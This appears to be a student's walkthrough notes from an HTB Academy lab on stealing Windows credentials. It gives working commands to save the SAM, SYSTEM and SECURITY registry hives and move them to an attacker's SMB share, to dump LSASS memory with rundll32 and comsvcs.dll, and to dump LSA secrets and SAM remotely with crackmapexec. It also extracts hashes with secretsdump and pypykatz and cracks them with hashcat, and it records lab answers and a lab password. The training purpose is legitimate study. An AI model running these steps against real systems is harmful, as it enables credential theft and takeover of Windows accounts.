# Attacking SAM & LSASS

## Attacking SAM

With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline.

There are three registry hives that we can copy if we have local admin access on the target ->

<table><thead><tr><th width="182">Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.</td></tr><tr><td><code>hklm\system</code></td><td>Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.</td></tr><tr><td><code>hklm\security</code></td><td>Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</td></tr></tbody></table>

We can create backups of these hives using the `reg.exe` utility.

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
```

Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let's use [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)

```shell-session
ElFelixi0@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Once we have the share running on our attack host, we can use the `move` command on the Windows target to move the hive copies to the share.

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
```

And then once everything is on the attackbox we can dump it using secretsdump ->

```shell-session
ElFelixi0@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

we can copy the NT hashes associated with each user account into a text file and start cracking passwords.

```shell-session
ElFelixi0@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
<SNIP>
```

and in hashcat ->

```shell-session
ElFelixi0@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Remote Dumping

Using crackmapexec (better to use netexec but in the course it will be cme) we can extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

```shell-session
ElFelixi0@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

**Dumping SAM Remotely**

```shell-session
ElFelixi0@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

_**Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.**_

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
hashcat -m 1000 realnthash.txt /usr/share/wordlists/rockyou.txt.gz
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>c02478537b9727d391bc80011c2e2321:matrix</p></figcaption></figure>

_**Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer.**_

```
crackmapexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Attacking LSASS

LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

LSASS will:

* Cache credentials locally in memory
* Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

With access to an interactive graphical session with the target, we can use task manager to create a memory dump.

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption><p><code>Open Task Manager</code> > <code>Select the Processes tab</code> > <code>Find &#x26; right click the Local Security Authority Process</code> > <code>Select Create dump file</code></p></figcaption></figure>

And a file will be created here ->

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

And we can transfer the file to our local machine just like the sam one.

### Rundll32

We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line.

we must determine what process ID (`PID`) is assigned to `lsass.exe` throught cmd or powershell

_**CMD:**_

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
<SNIP>
lsass.exe                      672 KeyIso, SamSs, VaultSvc
```

_**Powershell:**_

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

And then we can use rundll ->

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`) and we can transfer that file to attackbock just like the others.

### Pypykatz to Extract Credentials

Now that we have our dmp file we can use [pypykatz](https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file.

```shell-session
ElFelixi0@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

The output will looksomething like this ->

```shell-session
<SNIP>
== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
<SNIP>	
```

Now we can use Hashcat to crack the NT Hash.

```shell-session
ElFelixi0@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

_**Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer.**_

<figure><img src="../../../../.gitbook/assets/image (1455).png" alt=""><figcaption><p>C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP</p></figcaption></figure>

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1032889/Documents/
```

<figure><img src="../../../../.gitbook/assets/image (1456).png" alt=""><figcaption></figcaption></figure>

```
pypykatz lsa minidump lsass.DMP
```

<figure><img src="../../../../.gitbook/assets/image (1457).png" alt=""><figcaption><p>31f87811133bc6aaa75a536e77f64314</p></figcaption></figure>

```
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt.gz
```

<figure><img src="../../../../.gitbook/assets/image (1458).png" alt=""><figcaption><p>31f87811133bc6aaa75a536e77f64314:Mic@123</p></figcaption></figure>
